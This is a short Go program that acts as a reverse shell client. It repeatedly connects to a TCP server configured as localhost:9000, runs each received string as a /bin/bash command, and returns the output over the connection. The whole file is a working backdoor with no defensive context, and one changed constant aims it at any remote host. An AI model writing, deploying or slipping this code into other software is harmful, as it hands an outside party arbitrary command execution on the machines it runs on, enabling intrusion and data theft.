package main

import (
	"fmt"
	"io"
	"net"
	"os/exec"
)

const (
	network   = "tcp"
	host      = "localhost"
	port      = "9000"
	seperator = ":"
)

func main() {

	buf := make([]byte, 2048)

	for {

		conn, err := net.Dial("tcp", host+seperator+port)
		if err != nil {
			fmt.Println(err)
			return
		}

		nbytes, err := conn.Read(buf)
		if err == io.EOF {
			//NOP
		} else if err != nil {
			fmt.Println(err)
			return
		}

		cmd := exec.Command("/bin/bash", "-c", string(buf[:nbytes]))
		output, err := cmd.CombinedOutput()
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("Error: Invalid command %v\n", err)))
		}

		_, err = conn.Write(output)
		if err != nil {
			fmt.Println(err)
			return
		}

		conn.Close()
	}
}
